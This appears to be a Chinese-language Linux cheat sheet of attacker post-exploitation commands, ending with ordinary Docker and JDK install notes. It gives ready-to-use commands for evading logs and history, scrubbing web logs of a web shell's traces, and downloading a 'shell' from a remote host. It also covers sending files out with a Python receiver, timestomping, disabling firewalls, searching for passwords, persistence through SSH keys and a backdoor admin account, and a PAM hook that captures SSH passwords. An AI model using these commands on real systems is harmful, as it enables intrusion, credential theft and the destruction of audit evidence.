# Linux 命令速查

## 本次不记录命令

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```

## 常用日志清理

```
echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok
```


- /var/log/btmp   记录所有登录失败信息，使用lastb命令查看
- /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
- /var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
- /var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
- /var/log/secure   记录与安全相关的日志信息
- /var/log/message  记录系统启动后的信息和错误日志

## Web 日志清理

```
直接替换日志ip地址:
sed -i 's/127.0.0.1/192.168.1.1/g' access.log

清除部分相关日志:
使用grep -v来把相关信息删除:
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log

把修改过的日志覆盖到原日志文件:
cat tmp.log > /var/log/nginx/access.log
```


## 设置终端代理

```
export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890
```

## 查看用户登录记录

```
last
```

## root 权限创建管理员用户

```
sudo useradd -m testt && echo "testt:admin@123" | sudo chpasswd && sudo usermod -aG wheel testt
```

## cURL/wget 下载文件

```
wget -P /tmp/ http://x.x.x.x:8080/shell
curl -o /tmp/xxx http://x.x.x.x:8080/shell
```

## curl/wget 发送文件

```bash
curl -X POST --data-binary @file.txt http://localhost:9000

wget --post-file=file.txt http://localhost:9000

curl -T file.txt http://localhost:9000
```

```python
import socket

def start_server(host, port, buffer_size=1024):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"服务器正在 {host}:{port} 监听...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"连接来自 {addr}")

        # 读取HTTP请求头
        request = b""
        while b"\r\n\r\n" not in request:
            request += client_socket.recv(buffer_size)
        
        headers, file_data = request.split(b"\r\n\r\n", 1)

        # 提取文件名（可以根据实际需求修改提取方式）
        file_name = "received_file"  # 默认文件名

        # 保存文件
        with open(file_name, 'wb') as f:
            f.write(file_data)
            while True:
                data = client_socket.recv(buffer_size)
                if not data:
                    break
                f.write(data)

        print(f"文件 {file_name} 已保存")
        client_socket.close()

if __name__ == "__main__":
    HOST = '0.0.0.0'
    PORT = 9000
    start_server(HOST, PORT)
```

## 文件时间修改

> 修改 /www/wwwroot/shell.php 时间为 2024.05.16.24

```
touch -t 202405161200.24 /www/wwwroot/shell.php
```

## 查看 DNS 服务器

```
cat /etc/resolv.conf
```

## 停止防火墙

```
systemctl stop firewalld
service iptables stop

ubuntu:
ufw disable
```

## 搜索敏感信息

```
find / -regex ".*\.properties\|.*\.conf\|.*\.config\|.*\.yaml\|.*\.sh|.*\.jsp|.*\.log|.*\.txt|.*\.xml" | xargs grep -E "=jdbc:|pass=|passwd=|aliyun|password"
```

## echo 写文件

```
//直接 echo 写入：
echo xxx > /www/xxx.jsp

//base64 写入：
echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp

//追加
echo xxx >> /www/xxx.jsp
```

在线编码：https://forum.ywhack.com/coding.php

## 写入 ssh 公钥：

```
echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys
```

```
//使用  printf 在末尾处插入，如需换行可添加\n
//参考https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc

printf "ssh-rsa xxx" >> /root/.ssh/authorized_keys
```

## 压缩打包文件

```
//将 /home/mail /home/web 两个目录打包至 /tmp 目录下命名为web.tar.gz
tar czvf /tmp/web.tar.gz /home/mail /home/web

//zip
zip -r /tmp/web.zip /home/mail /home/web

//可使用 -x 排除，如:
zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*
```

## 分割上传

```
split -n 3 fscan  //分割为 3 个文件
split -b 500k fscan  //以 500 K 大小分割 fscan

Windows 合并：
copy /b xaa+xab fscan
type xaa xab > fscan

Linux 合并：
cat xaa xab > fscan
```

## 十六进制获取文件

```
# 将文件转换为十六进制
xxd -p filename 
```

```
# 本地还原：
xxd -p -r filename > aa.tar.gz
```

## pam_exec 抓 SSH 密码

需要关闭 SELinux：
```
setenforce 0 # 关闭
setenforce 1 # 开启
```

修改 `/etc/pam.d/sshd` 第一行添加：

```
auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh
```

/tmp/sshd.sh:

> `chmod 777 /tmp/sshd.sh`

```bash
#!/bin/sh

echo "$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER" >> /tmp/123.log
```


## Debian/Ubuntu Docker 安装

> Debian 12 / Ubuntu 24.04 安装 Docker 以及 Docker Compose

**安装一些必要的软件包**

```
apt update
apt upgrade -y
apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates
```

**加入 Docker 的 GPG 公钥和 apt 源**

```
Debian:
curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list

Ubuntu:
curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
```

国内机器可以用清华 TUNA 的国内源:

```
Debian:
curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list

Ubuntu:
curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable" > /etc/apt/sources.list.d/docker.list
```

然后更新系统后即可安装 Docker CE 和 Docker Compose 插件

```
apt update
apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin

```

**安装 Docker Compose**

```
curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 > /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

```

## JDK 安装

```
ubuntu18运行
sudo apt install openjdk-11-jre-headless
sudo apt install openjdk-11-jdk
```

```
手动
tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz
cd jdk-13.0.2/
pwd
vim /etc/profile

export JAVA_HOME=/root/jdk-13.0.2
export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin

source /etc/profile
```